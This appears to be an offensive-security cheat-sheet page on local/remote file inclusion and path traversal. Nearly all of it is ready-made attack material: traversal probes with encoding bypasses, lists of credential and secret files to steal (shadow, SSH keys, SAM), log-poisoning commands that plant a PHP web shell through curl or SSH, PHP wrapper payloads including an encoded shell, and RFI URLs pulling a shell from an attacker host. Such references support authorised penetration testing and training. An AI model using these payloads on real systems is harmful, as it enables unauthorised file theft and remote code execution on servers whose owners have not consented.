---
title: LFI / RFI / Path Traversal
category: web
description: Read files, leak source, escalate to RCE.
tags: [lfi, rfi, traversal, web]
os: [any]
order: 30
---

## Classic probes

```text
../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
/etc/passwd%00         (PHP <5.3.4)
php://filter/convert.base64-encode/resource=index.php
```

## Linux high-value files

```text
/etc/passwd                    /etc/shadow                /etc/hosts
/proc/self/environ             /proc/self/cmdline         /proc/self/status
/proc/<pid>/fd/<n>             /proc/sched_debug
/var/log/apache2/access.log    /var/log/nginx/access.log  /var/log/auth.log
/root/.bash_history            /home/{{USER}}/.ssh/id_rsa
/var/www/html/config.php       /var/lib/mysql/...
```

## Windows high-value files

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\{{USER}}\NTUser.dat
C:\Windows\System32\config\SAM
C:\Windows\debug\NetSetup.log
C:\Windows\Panther\unattend.xml
```

## LFI → RCE: log poisoning

Inject PHP into a log the LFI can include:

```bash
curl http://{{RHOST}}/ -A "<?php system(\$_GET['c']); ?>"
# then
curl "http://{{RHOST}}/index.php?page=/var/log/apache2/access.log&c=id"
```

## LFI → RCE: PHP wrappers

```text
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
php://input              (POST body becomes the file contents)
expect://id              (if expect extension)
phar://malicious.phar    (deserialization w/ uploaded phar)
```

## SSH log poison

```bash
ssh '<?php system($_GET[c]); ?>'@{{RHOST}}
# Then LFI /var/log/auth.log?c=id
```

## RFI

```text
http://{{RHOST}}/page.php?file=http://{{LHOST}}/shell.txt
http://{{RHOST}}/page.php?file=//{{LHOST}}/shell.txt
```

Requires `allow_url_include=On` in PHP (rare today).
